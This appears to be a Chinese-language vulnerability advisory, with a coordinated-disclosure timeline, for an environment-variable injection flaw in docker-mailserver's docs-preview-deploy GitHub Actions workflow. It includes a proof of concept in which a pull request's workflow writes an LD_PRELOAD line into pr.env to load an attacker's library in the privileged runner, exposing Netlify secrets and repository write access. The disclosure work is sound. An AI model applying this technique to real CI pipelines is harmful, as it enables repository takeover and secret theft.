修复 `docker-mailserver` 项目中的环境变量注入漏洞，防止敏感信息泄露与仓库操控

# 协调披露时间表
- **2024-10-02**：通过 GitHub 的私人漏洞报告功能提交漏洞报告。
- **2024-10-30**：漏洞修复完成。

---

# 概要
在 `docker-mailserver` 项目中的 `docs-preview-deploy.yml` workflow 存在环境变量注入漏洞，这可能导致敏感信息泄漏及对仓库的恶意操作。

---

## 项目
- **名称**：docker-mailserver
- **测试版本**：报告时的最新提交版本

---

## 漏洞详情

### 1. 环境变量注入
- **位置**：`docs-preview-deploy.yml` 工作流
- **触发条件**：当 Documentation (PR) 工作流完成时触发。

### 工作流配置示例
```yaml
on:
  workflow_run:
    workflows: ['Documentation (PR)']
    types:
      - completed
```

### 工作流步骤分析
在触发工作流后，`docs-preview-deploy.yml` 会执行以下操作：
1. **下载并提取构建工件**：
    ```yaml
    - name: 'Download build artifact'
      uses: actions/download-artifact@v4
      with:
        name: preview-build
        github-token: ${{ secrets.GITHUB_TOKEN }}
        run-id: ${{ github.event.workflow_run.id }}
    ```
2. **读取并设置环境变量**：
    ```yaml
    - name: 'Extract build artifact'
      run: tar -xf artifact.tar.zst

    - name: 'Restore preserved ENV'
      run: cat pr.env >> "${GITHUB_ENV}"
    ```
   
   由于 `pr.env` 文件的内容可能被恶意用户控制，因此攻击者可以通过向该文件注入任意环境变量来控制工作流环境。

---

### 漏洞利用示例
攻击者可以通过 Pull Request 提交一个包含恶意内容的 `inject.so` 文件和 `pr.env` 文件，比如：
```plaintext
... 其他变量 ...
LD_PRELOAD=/home/runner/work/docker-mailserver/docker-mailserver/inject.so
```

- **结果**：`LD_PRELOAD` 变量会在运行器中被定义，强制系统加载攻击者提供的 `inject.so` 库，使得后续的任何进程都会加载这个恶意库。

### 代码注入示例
以下步骤模拟了攻击者利用此漏洞的方法：
1. 克隆仓库，修改 `docs-preview-prepare.yml`：
    ```yaml
    name: 'Documentation (PR)'

    on:
      pull_request:

    jobs:
      prepare-preview:
        name: 'Build Preview'
        runs-on: ubuntu-22.04
        steps:
          - name: 'Prepare artifact for transfer'
            run: |
              {
                echo "PR_HEADSHA=${{ github.event.pull_request.head.sha }}"
                echo "PR_NUMBER=${{ github.event.pull_request.number }}"
                echo "PR_TITLE=${{ github.event.pull_request.title }}"
                echo "NETLIFY_SITE_PREFIX=pullrequest-${{ github.event.pull_request.number }}"
                echo "BUILD_DIR=docs/site"
                echo "LD_PRELOAD=/home/runner/work/docker-mailserver/docker-mailserver/inject.so"
              } >> pr.env
              tar --zstd -cf artifact.tar.zst pr.env

          - name: 'Upload artifact for workflow transfer'
            uses: actions/upload-artifact@v4
            with:
              name: preview-build
              path: artifact.tar.zst
              retention-days: 1
    ```
2. 创建一个包含这些更改的 Pull Request，从而触发恶意工作流，污染环境变量。

---

## 影响
如果被利用，该漏洞会授予攻击者以下权限：
- **Actions**、**Attestations**、**Checks**、**Contents**、**Deployments**、**Discussions**、**Issues**、**Packages**、**Pages**、**PullRequests**、**RepositoryProjects**、**SecurityEvents**、**Statuses**的写权限。
- 暴露以下机密信息：`secrets.NETLIFY_AUTH_TOKEN` 和 `secrets.NETLIFY_SITE_ID`。
